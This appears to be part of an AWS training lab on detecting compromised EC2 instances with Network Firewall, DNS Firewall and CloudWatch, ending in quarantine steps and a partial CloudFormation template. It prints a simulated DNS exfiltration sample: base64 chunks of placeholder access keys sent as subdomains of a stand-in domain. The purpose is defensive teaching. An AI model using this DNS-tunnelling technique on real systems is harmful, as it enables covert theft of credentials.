So far, so good. AnyCompany’s network has been re-architected using a hub-and-spoke architecture that sends all traffic through AWS Network Firewall. Stateful rules have been deployed that evaluate and filter traffic. Similarly, Route53 Resolver DNS Firewall is enforcing DNS rules and queries are being logged. You’ve done an excellent job securing the network and gaining visibility into traffic flows. Perhaps, with this enhanced visibility, you find that some of AnyCompany’s existing Amazon EC2 instances have been compromised.

In this task, you use Amazon CloudWatch to identify rogue instances. CloudWatch provides multiple interfaces enabling administrators to query and visualize log data. Let’s start by configuring a Contributor Insights rule that looks for instances querying domains on your RestrictedDomains domain list.


93. At the top of the AWS Management Console, in the search bar, search for and choose CloudWatch.
94. In the panel on the left side of the screen, open the  Logs menu and select Contributor Insights.

    You are brought to the Contributor Insights page.

    Note: Contributor Insights helps you understand usage patterns by providing visualizations and summaries of your log data. It is ideal for examining logs with a large number of URLS, IP addresses or unique identifiers.

95. Choose the Create rule button.
96. Configure a rule using the following parameters:

    - Select log group(s): Select the checkbox next to /Lab/Route53/QueryLogs.
    - Rule type: Choose the radio button next to Custom rule.
    - Log format: Choose the radio button next to JSON.
    - Contribution: Choose the Add new key button and enter srcids.instance then choose the Add new key button again and enter query_name.
    - Filters: Expand the  Filters menu and then press the Add new filter button and add the following filter:

      | Match	| Condition |	Value|
      |---|---|---|	
      |	firewall_rule_action	|	In|		BLOCK|
      
    - Aggregation: Choose the radio button next to Count.

97. At the bottom of the screen, choose the Next button.
98. In the Rule name field, enter `Blocked-DNS-Queries`.
99. Scroll to the bottom of the page and choose the Next button.
100. Review the rule settings and choose the **Create rule** button.

     It takes several minutes before data begins to be captured by your rule. In the meantime, use CloudWatch Log Insights to see if the AWS Network Firewall has discovered any unusual traffic.

101. In the CloudWatch panel on the left of the screen, open the  Logs menu and select Log Insights.

     You are brought to the Log Insights console, which enables you to search your logs using query syntax.

102. Recall that your AWS Network Firewall rule groups send data to a log group called /Lab/NetworkFirewall/Alert. Open the dropdown menu at the top of the Log Insights panel and select `/Lab/NetworkFirewall/Alert`.

103. Command: Enter the following query in the text area to see if any of your rule groups triggered alerts:
     ```
     fields @timestamp, @message
     | display event.timestamp
     ```
     Note: The following list provides an explanation of how this query works:
     - Selects fields @timestamp and @message from the logs
     - Displays the timestamp for any matching logs


104. Choose the Run query button.

     <img width="736" height="602" alt="image" src="https://github.com/user-attachments/assets/e122c124-abb4-4635-83a0-4ee481daa457" />
     
     The query returns a large number of matching logs from the Alert log group. Remember that not all matches are necessarily indicative of a threat. It requires further investigation to determine exactly what is going on. Let’s start by checking to see if any EC2 instances attempted to connect to the domains listed in the AWS Network Firewall domain list you created.

105. Command: AWS Network Firewall assigns an alert signature to logs that match a rule group. You can use these alert signatures to filter your results. Update the query as follows:
     ```
     fields @timestamp, @message
     | filter event.alert.signature like /denylisted FQDNs/
     | display event.tls.sni, event.src_ip
     ```
     Note: The following list provides an explanation of how this query works:
     - Selects fields @timestamp and @message from the logs
     - Searches for alert signatures that contain denylisted FQDNs
     - Displays the target FQDN and the source IP

106. Choose the Run query button.

     <img width="735" height="652" alt="image" src="https://github.com/user-attachments/assets/34e640d8-2bc9-4193-98d7-a7ae0a571b49" />
     
     Expected output:
     
     |#	| event.tls.sni | event.src_ip|
     |---|---|---|
     |1	|www.example.net| 10.1.1.230| 
 
     This time only one result is returned, showing that an instance queried www.example.net.

     Note: Recall that when you created your domain list, you connected to an EC2 instance and ran the following command to test your domain list: `curl https://www.example.net --max-time 5`. This alert corresponds to that command, so you can safely ignore it.

108. Now that we’ve concluded that the domain list is not responsible for the alerts, enter the following query to see if any of them were triggered by the IcmpAlert-RuleGroup:
     ```
     fields @timestamp, @message
     | filter event.proto like /ICMP/
     | display event.src_ip
     | sort event.src_ip desc
     ```
    
     Note: The following list provides an explanation of how this query works:
     - Selects fields @timestamp and @message from the logs
     - Searches for messages that contain the string ICMP
     - Sorts the results by IP address

109. Choose the Run query button.

     <img width="734" height="647" alt="image" src="https://github.com/user-attachments/assets/6968e218-fa2d-4289-82da-0c87034b50cf" />
     
     Expected output:
    
     |#	| event.src_ip |
     |---|---|
     |1	|10.2.1.85|
     |2	|10.2.1.85|
     |3	|10.2.1.85|
     |…	||
 
 Security: This is concerning. It appears that at very regular intervals, an EC2 instance is sending out large number of ICMP requests. This could be indicative of a compromised instance performing a port scan.

109. Make a note of the IP address listed in the event.src_ip column.

     Before remediating this finding, continue your search. It’s possible that there could be more than one rogue instance in the network.

110. Enter the following query to see if any alerts were generated by non-TLS traffic using port 443:
     ```
     fields @timestamp, @message
     | filter event.alert.signature like /SURICATA/
     | display event.src_ip
     | sort event.src_ip desc
     ```
    
     Note: The following list provides an explanation of how this query works:
     - Selects fields @timestamp and @message from the logs
     - Searches for alert signatures that contain SURICATA
     - Sorts the results by IP address

111. Choose the Run query button.

It appears that you’ve identified another potentially compromised EC2 instance. Let’s take a closer look at the log message.

112. Choose the  arrow next to any of the results to display the message.

     Expected output: The log message should look similar to the image below:

     <img width="857" height="649" alt="image" src="https://github.com/user-attachments/assets/165f36cd-671f-4d97-bd39-17e431ac3214" />


Image description: The preceding diagram shows an alert captured in Amazon Cloudwatch. The log message indicates that an instance was using the FTP protocol on port 443.

 Security: The typical ports used for FTP are 20 and 21, but this alert indicates that an instance is using FTP on port 443, which is very unusual. This could indicate that someone is trying to bypass security measures or perform malicious activities by using non-standard ports. It’s recommended to investigate such incidents and take appropriate actions to ensure the security of the network.

Once again, note the IP address associated with the alerts.

By now, your Amazon Cloudwatch Contributor Insights rule should have started ingesting data. Let’s see if it’s found anything suspicious.

In the panel on the left side of the screen, open the  Logs menu and select Contributor Insights.

You are brought to the Contributor Insights Rules page.

115. Choose the Blocked-DNS-Queries link.

116. In order for results to show up on screen, you may need to adjust the display settings. Configure the following settings:
     - Contributors: Open the dropdown menu and select Top 50
     - Period: Open the dropdown menu and select 1 Minute
     - Order by: Open the dropdown menu and select Max
     - Widget type: Open the dropdown menu and select Stacked area
     - Time range: Select 30m
     - Refresh: Open the dropdown menu and select 10s
       
     The Contributors chart reloads showing a series of dots in a vertical line. Each dot represents a blocklisted domain that was queried by an EC2 instance on AnyCompany’s network.

     <img width="838" height="692" alt="image" src="https://github.com/user-attachments/assets/785b0641-8bbd-450d-bd32-9823b89c679b" />


     Image description: The preceding diagram shows a chart with a series of dots aligned vertically.

117. Scroll down the page and review the table beneath the chart. Expand the column labelled $.srcids.instance - $.query_name so that you are able to see the entirety of its contents.

     Note: This table shows the instance ID and target domain that was queried. Note that all of the queries were sent by the same instance. This is the complete list of queries that were blocked:
     
     ```
     IyBTYW1wbGUgUmVwb3J0IC0gTm8gaWRlbnRpZmljYXRpb24gb2YgYWN0dWFsIHB.example.xyz
     lcnNvbnMKIyBvciBzZWN1cml0eSBjcmVkZW50aWFscyBpcyBpbnRlbmRlZCBvci.example.xyz
     BzaG91bGQgYmUgaW5mZXJyZWQuCk5hbWUsQWNjZXNzIEtleSxTZWNyZXQgQWNjZ.example.xyz
     XNzIEtleQpKb3JnZSBTb3V6YSxBS0lBSU9TRk9ETk43RVhBTVBMRSx3SmFsclhV.example.xyz
     dG5GRU1JL0s3TURFTkcvYlB4UmZpQ1lFWEFNUExFS0VZCkFybmF2IERlc2FpLEF.example.xyz
     LSUFJNDRRSDhESEJFWEFNUExFLGplN010R2JDbHdCRi8yWnA5VXRrL2gzeUNvOG.example.xyz
     52YkVYQU1QTEVLRVkKTmlra2kgV29sZixBS0lBSUpIM1hVWjlFWEFNUExFLDdnU.example.xyz
     m1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKUGF0IENhbmRl.example.xyz
     bGxhLEFLSUFJOUs4WjVXNkVYQU1QTEUsM0hsUm1JNnhIa01qTjhnN01ERU5HLzZ.example.xyz
     IazlKa1lpQ0VYQU1QTEVLRVkKWmhhbmcgV2VpLEFLSUFJNUszWjhRN0VYQU1QTE.example.xyz
     UsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKQWxla.example.xyz
     mFuZHJvIFJvc2FsZXosQUtJQUk2SzNaOFE4RVhBTVBMRSw5SmtSbUk2eEhrTWpO.example.xyz
     OGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpBa3VhIE1hbnNhLEFLSUFJN0s.example.xyz
     zWjhROUVYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU.example.xyz
     1QTEVLRVkKQW5hIENhcm9saW5hIFNpbHZhLEFLSUFJOEszWjhRMEVYQU1QTEUsO.example.xyz
     UprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKQXJuYXYg.example.xyz
     RGVzYWksQUtJQUk5SzNaOFExRVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TURFTkc.example.xyz
     vNkhrOUprWWlDRVhBTVBMRUtFWQpDYXJsb3MgU2FsYXphcixBS0lBSTBLM1o4UT.example.xyz
     JFWEFNUExFLDlKa1JtSTZ4SGtNak44ZzdNREVORy82SGs5SmtZaUNFWEFNUExFS.example.xyz
     0VZCkRpZWdvIFJhbWlyZXosQUtJQUkxSzNaOFEzRVhBTVBMRSw5SmtSbUk2eEhr.example.xyz
     TWpOOGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpFZnVhIE93dXN1LEFLSUF.example.xyz
     JMkszWjhRNEVYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0.example.xyz
     VYQU1QTEVLRVkKSmFuZSBEb2UsQUtJQUkzSzNaOFE1RVhBTVBMRSw5SmtSbUk2e.example.xyz
     EhrTWpOOGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpKb2huIERvZSxBS0lB.example.xyz
     STRLM1o4UTZFWEFNUExFLDlKa1JtSTZ4SGtNak44ZzdNREVORy82SGs5SmtZaUN.example.xyz
     FWEFNUExFS0VZCkpvaG4gU3RpbGVzLEFLSUFJNUszWjhRN0VYQU1QTEUsOUprUm.example.xyz
     1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKSm9yZ2UgU291e.example.xyz
     mEsQUtJQUk2SzNaOFE4RVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TURFTkcvNkhr.example.xyz
     OUprWWlDRVhBTVBMRUtFWQpLd2FrdSBNZW5zYWgsQUtJQUk3SzNaOFE5RVhBTVB.example.xyz
     MRSw5SmtSbUk2eEhrTWpOOGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpLd2.example.xyz
     VzaSBNYW51LEFLSUFJOEszWjhRMEVYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ER.example.xyz
     U5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKTGkgSnVhbixBS0lBSTlLM1o4UTFFWEFN.example.xyz
     UExFLDlKa1JtSTZ4SGtNak44ZzdNREVORy82SGs5SmtZaUNFWEFNUExFS0VZCkx.example.xyz
     pdSBKaWUsQUtJQUkwSzNaOFEyRVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TURFTk.example.xyz
     cvNkhrOUprWWlDRVhBTVBMRUtFWQpNw6FyY2lhIE9saXZlaXJhLEFLSUFJMUszW.example.xyz
     jhRM0VYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1Q.example.xyz
     TEVLRVkKTWFyw61hIEdhcmPDrWEsQUtJQUkySzNaOFE0RVhBTVBMRSw5SmtSbUk.example.xyz
     2eEhrTWpOOGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpNYXJ0aGEgUml2ZX.example.xyz
     JhLEFLSUFJM0szWjhRNUVYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIa.example.xyz
     zlKa1lpQ0VYQU1QTEVLRVkKTWFyeSBNYWpvcixBS0lBSTRLM1o4UTZFWEFNUExF.example.xyz
     LDlKa1JtSTZ4SGtNak44ZzdNREVORy82SGs5SmtZaUNFWEFNUExFS0VZCk1hdGV.example.xyz
     vIEphY2tzb24sQUtJQUk1SzNaOFE3RVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TU.example.xyz
     RFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpOaWtoaWwgSmF5YXNoYW5rYXIsQUtJQ.example.xyz
     Uk2SzNaOFE4RVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TURFTkcvNkhrOUprWWlD.example.xyz
     RVhBTVBMRUtFWQpOaWtraSBXb2xmLEFLSUFJN0szWjhROUVYQU1QTEUsOUprUm1.example.xyz
     JNnhIa00K.example.xyz
     ```
 Security: Note that all of the subdomains in these queries look like they may be base64 encoded strings. Also note the large number of queries made to the same domain (example.xyz) in a very short period of time. Taken together, this looks highly suspect and could be indicative of DNS exfiltration. DNS exfiltration is a technique used by attackers to extract sensitive data from a target network by encoding the data and transmitting it over DNS requests. This is done to bypass security measures, as DNS is often allowed to pass through firewalls and is not typically monitored as closely as other protocols like HTTP or HTTPS. Fortunately, your DNS firewall stopped this exfiltration attempt.

Make a note of the instance ID listed next to the queried domains.

 Task complete: Great job! It looks like your efforts have paid off. Not only did your new architecture provide you with greater visibility into network traffic, but it also helped you to identify three instances that may have been compromised.

Task 5: DNS exfiltration
The results shown in Contributor Insights suggest that an attacker was encoding and attempting to exfiltrate stolen data to a domain under their control. Can you figure out what data the attacker was trying to exfiltrate?

 Hint: To find the original data, you have to decode the base64 strings in the DNS requests.

At the top of the AWS Management Console, in the search bar, search for and choose EC2.

On the EC2 Dashboard, choose Instances (running).

Select the Spoke-VPC-Command-Host instance and then choose the Connect button.

On the Connect to instance page, choose the Session Manager tab.

Choose Connect.

 Command: Start by entering the following command to write the complete list of requested DNS domains to a file:

```shell
cd ~
cat << 'EOF' > dnsqueries.txt
IyBTYW1wbGUgUmVwb3J0IC0gTm8gaWRlbnRpZmljYXRpb24gb2YgYWN0dWFsIHB.example.xyz
lcnNvbnMKIyBvciBzZWN1cml0eSBjcmVkZW50aWFscyBpcyBpbnRlbmRlZCBvci.example.xyz
BzaG91bGQgYmUgaW5mZXJyZWQuCk5hbWUsQWNjZXNzIEtleSxTZWNyZXQgQWNjZ.example.xyz
XNzIEtleQpKb3JnZSBTb3V6YSxBS0lBSU9TRk9ETk43RVhBTVBMRSx3SmFsclhV.example.xyz
dG5GRU1JL0s3TURFTkcvYlB4UmZpQ1lFWEFNUExFS0VZCkFybmF2IERlc2FpLEF.example.xyz
LSUFJNDRRSDhESEJFWEFNUExFLGplN010R2JDbHdCRi8yWnA5VXRrL2gzeUNvOG.example.xyz
52YkVYQU1QTEVLRVkKTmlra2kgV29sZixBS0lBSUpIM1hVWjlFWEFNUExFLDdnU.example.xyz
m1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKUGF0IENhbmRl.example.xyz
bGxhLEFLSUFJOUs4WjVXNkVYQU1QTEUsM0hsUm1JNnhIa01qTjhnN01ERU5HLzZ.example.xyz
IazlKa1lpQ0VYQU1QTEVLRVkKWmhhbmcgV2VpLEFLSUFJNUszWjhRN0VYQU1QTE.example.xyz
UsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKQWxla.example.xyz
mFuZHJvIFJvc2FsZXosQUtJQUk2SzNaOFE4RVhBTVBMRSw5SmtSbUk2eEhrTWpO.example.xyz
OGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpBa3VhIE1hbnNhLEFLSUFJN0s.example.xyz
zWjhROUVYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU.example.xyz
1QTEVLRVkKQW5hIENhcm9saW5hIFNpbHZhLEFLSUFJOEszWjhRMEVYQU1QTEUsO.example.xyz
UprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKQXJuYXYg.example.xyz
RGVzYWksQUtJQUk5SzNaOFExRVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TURFTkc.example.xyz
vNkhrOUprWWlDRVhBTVBMRUtFWQpDYXJsb3MgU2FsYXphcixBS0lBSTBLM1o4UT.example.xyz
JFWEFNUExFLDlKa1JtSTZ4SGtNak44ZzdNREVORy82SGs5SmtZaUNFWEFNUExFS.example.xyz
0VZCkRpZWdvIFJhbWlyZXosQUtJQUkxSzNaOFEzRVhBTVBMRSw5SmtSbUk2eEhr.example.xyz
TWpOOGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpFZnVhIE93dXN1LEFLSUF.example.xyz
JMkszWjhRNEVYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0.example.xyz
VYQU1QTEVLRVkKSmFuZSBEb2UsQUtJQUkzSzNaOFE1RVhBTVBMRSw5SmtSbUk2e.example.xyz
EhrTWpOOGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpKb2huIERvZSxBS0lB.example.xyz
STRLM1o4UTZFWEFNUExFLDlKa1JtSTZ4SGtNak44ZzdNREVORy82SGs5SmtZaUN.example.xyz
FWEFNUExFS0VZCkpvaG4gU3RpbGVzLEFLSUFJNUszWjhRN0VYQU1QTEUsOUprUm.example.xyz
1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKSm9yZ2UgU291e.example.xyz
mEsQUtJQUk2SzNaOFE4RVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TURFTkcvNkhr.example.xyz
OUprWWlDRVhBTVBMRUtFWQpLd2FrdSBNZW5zYWgsQUtJQUk3SzNaOFE5RVhBTVB.example.xyz
MRSw5SmtSbUk2eEhrTWpOOGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpLd2.example.xyz
VzaSBNYW51LEFLSUFJOEszWjhRMEVYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ER.example.xyz
U5HLzZIazlKa1lpQ0VYQU1QTEVLRVkKTGkgSnVhbixBS0lBSTlLM1o4UTFFWEFN.example.xyz
UExFLDlKa1JtSTZ4SGtNak44ZzdNREVORy82SGs5SmtZaUNFWEFNUExFS0VZCkx.example.xyz
pdSBKaWUsQUtJQUkwSzNaOFEyRVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TURFTk.example.xyz
cvNkhrOUprWWlDRVhBTVBMRUtFWQpNw6FyY2lhIE9saXZlaXJhLEFLSUFJMUszW.example.xyz
jhRM0VYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIazlKa1lpQ0VYQU1Q.example.xyz
TEVLRVkKTWFyw61hIEdhcmPDrWEsQUtJQUkySzNaOFE0RVhBTVBMRSw5SmtSbUk.example.xyz
2eEhrTWpOOGc3TURFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpNYXJ0aGEgUml2ZX.example.xyz
JhLEFLSUFJM0szWjhRNUVYQU1QTEUsOUprUm1JNnhIa01qTjhnN01ERU5HLzZIa.example.xyz
zlKa1lpQ0VYQU1QTEVLRVkKTWFyeSBNYWpvcixBS0lBSTRLM1o4UTZFWEFNUExF.example.xyz
LDlKa1JtSTZ4SGtNak44ZzdNREVORy82SGs5SmtZaUNFWEFNUExFS0VZCk1hdGV.example.xyz
vIEphY2tzb24sQUtJQUk1SzNaOFE3RVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TU.example.xyz
RFTkcvNkhrOUprWWlDRVhBTVBMRUtFWQpOaWtoaWwgSmF5YXNoYW5rYXIsQUtJQ.example.xyz
Uk2SzNaOFE4RVhBTVBMRSw5SmtSbUk2eEhrTWpOOGc3TURFTkcvNkhrOUprWWlD.example.xyz
RVhBTVBMRUtFWQpOaWtraSBXb2xmLEFLSUFJN0szWjhROUVYQU1QTEUsOUprUm1.example.xyz
JNnhIa00K.example.xyz
EOF
```
 Expected output:

None, unless there is an error.

Enter the following command to decrypt the subdomains:


awk -F "." '{print $1}' dnsqueries.txt | base64 --decode
 Note: The following list provides an explanation of how commands and flags used in this command:

awk: A text processing tool that can be used to perform operations on text files.
-F “.”: Sets the field separator to a period (.), which means that the input text is split into fields based on the period character.
‘{print $1}’: The awk command to be executed, which prints the first field of each line.
dnsqueries.txt: The input file on which the awk command is performed.
base64: A command-line tool to encode and decode data using the base64 encoding scheme.
–decode: An option to specify that the input data should be decoded from base64 to its original form.
 Expected output:


************************
**** EXAMPLE OUTPUT ****
************************

# Sample Report - No identification of actual persons
# or security credentials is intended or should be inferred.
Name,Access Key,Secret Access Key
Jorge Souza,AKIAIOSFODNN7EXAMPLE,wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Arnav Desai,AKIAI44QH8DHBEXAMPLE,je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
Nikki Wolf,AKIAIJH3XUZ9EXAMPLE,7gRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Pat Candella,AKIAI9K8Z5W6EXAMPLE,3HlRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Zhang Wei,AKIAI5K3Z8Q7EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Alejandro Rosalez,AKIAI6K3Z8Q8EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Akua Mansa,AKIAI7K3Z8Q9EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Ana Carolina Silva,AKIAI8K3Z8Q0EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Arnav Desai,AKIAI9K3Z8Q1EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Carlos Salazar,AKIAI0K3Z8Q2EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Diego Ramirez,AKIAI1K3Z8Q3EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Efua Owusu,AKIAI2K3Z8Q4EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Jane Doe,AKIAI3K3Z8Q5EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
John Doe,AKIAI4K3Z8Q6EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
John Stiles,AKIAI5K3Z8Q7EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Jorge Souza,AKIAI6K3Z8Q8EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Kwaku Mensah,AKIAI7K3Z8Q9EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Kwesi Manu,AKIAI8K3Z8Q0EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Li Juan,AKIAI9K3Z8Q1EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Liu Jie,AKIAI0K3Z8Q2EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Márcia Oliveira,AKIAI1K3Z8Q3EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
María García,AKIAI2K3Z8Q4EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Martha Rivera,AKIAI3K3Z8Q5EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Mary Major,AKIAI4K3Z8Q6EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Mateo Jackson,AKIAI5K3Z8Q7EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Nikhil Jayashankar,AKIAI6K3Z8Q8EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
Nikki Wolf,AKIAI7K3Z8Q9EXAMPLE,9JkRmI6xHkM
This looks to be quite serious! It appears that an attacker gained access to this instance and was trying to use it to exfiltrtrate a list of access keys.

 Task complete: Nicely done! Not only did you prevent the DNS exfiltation, but you also figured out what data the attacker was trying to steal.

Task 6: Quarantine
In this final task, you focus on quarantining the three identified EC2 instances that pose potential threats to your network. Based on your analysis, you have concluded that the following EC2 instances need to be quarantined:

Spoke-VPC-TestInstance1
Spoke-VPC-TestInstance2
Spoke-VPC-TestInstance3
Instead of terminating these instances, you apply a new security group that effectively isolates them from interacting with other resources on the network and restricts their access to the internet. This approach ensures that the potentially compromised instances are contained, allowing for further investigation and remediation without causing additional damage to the network.

Return to the AWS Management Console and, in the search bar, search for and choose EC2.

On the EC2 Dashboard, choose Instances (running).

For each of the Spoke-VPC-TestInstance1, Spoke-VPC-TestInstance2, and Spoke-VPC-TestInstance3, perform the following steps to replace their existing security groups:

Select the checkbox next to instance name, open the Actions  menu, select Security, and then choose Change security groups.
Choose the Remove button next to the existing security group.
Place your cursor in the Select security groups text box and from the dropdown menu that appears, select QuarantineSG.
Choose the Add security group button.
Choose the Save button.
 Task complete: Great job! You’ve successfully quarantined the EC2 instances responsible for the security incidents you discovered.

Conclusion
You have successfully done the following:

Configured stateful rule groups in AWS Network Firewall that follow Suricata-compatible intrusion prevention system (IPS) rule specifications.
Used a combination of managed and custom DNS domain lists to create DNS Firewall that alerts administrators to suspicious queries.
Used Log Insights and Contributor Insights in Amazon CloudWatch to identify rogue EC2 instances.
End lab
Follow these steps to close the console and end your lab.

Return to the AWS Management Console.

At the upper-right corner of the page, choose AWSLabsUser, and then choose Sign out.

Choose End Lab and then confirm that you want to end your lab.

## Additional resources
[What is AWS Network Firewall?](https://docs.aws.amazon.com/network-firewall/latest/developerguide/what-is-aws-network-firewall.html)

[Route 53 Resolver DNS Firewall](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/resolver-dns-firewall.html)
Deployment models for AWS Network Firewall
Protect your network from DNS exfiltration attacks


## CloudFormation Templates

Template 1

```yaml
AWSTemplateFormatVersion: 2010-09-09
Description: This template creates 3 VPCs that are connected by Transit Gateway and populates them with subnets and EC2 instances.

Parameters:

  LatestAmiId:
    Description: Latest EC2 AMI from Systems Manager Parameter Store
    Type: 'AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>'
    Default: '/aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2'

  S3Bucket:
    Type: String
    Description: The S3 Bucket (e.g. us-west-2-aws-training) that contains the lab resources.
    Default: us-west-2-aws-training

  
Resources:

# Spoke VPC A:
  VPCA:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: "10.1.0.0/16"
      EnableDnsSupport: true
      EnableDnsHostnames: true
      InstanceTenancy: default
      Tags:
        - Key: Name
          Value: Spoke-VPC-A

  SubnetATGW:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCA
      CidrBlock: "10.1.0.0/28"
      AvailabilityZone:
        Fn::Select:
        - 0
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: Spoke-VPC-A-TGWSubnetA

  SubnetAWorkload:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCA
      CidrBlock: "10.1.1.0/24"
      AvailabilityZone: 
        Fn::Select:
        - 0
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: Spoke-VPC-A-WorkloadSubnetA

  VPCAEndpointSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
        GroupDescription: Allow instances to get to SSM Systems Manager
        VpcId: !Ref VPCA
        SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 443
          ToPort: 443
          CidrIp: 10.1.0.0/16

  VPCASSMEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref VPCAEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssm"
        SubnetIds: 
          - !Ref SubnetAWorkload
        VpcEndpointType: Interface
        VpcId: !Ref VPCA

  VPCAEC2MessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref VPCAEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ec2messages"
        SubnetIds: 
          - !Ref SubnetAWorkload
        VpcEndpointType: Interface
        VpcId: !Ref VPCA

  VPCASSMMessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref VPCAEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssmmessages"
        SubnetIds: 
          - !Ref SubnetAWorkload
        VpcEndpointType: Interface
        VpcId: !Ref VPCA
 
  SubnetARole:
    Type: AWS::IAM::Role
    Properties: 
      RoleName: !Sub "Spoke-VPC-A-WorkloadRole-${AWS::AccountId}"
      Path: "/"
      Policies:
        - PolicyName: deleteDefaultVpcPolicy
          PolicyDocument:
            Version: "2012-10-17"
            Statement:
              - Effect: Allow
                Action:
                - ec2:DescribeVpcs
                - ec2:DescribeSubnets
                - ec2:DeleteVpc
                - ec2:DeleteSubnet
                Resource: !Sub "arn:aws:ec2:${AWS::Region}:${AWS::AccountId}:*"
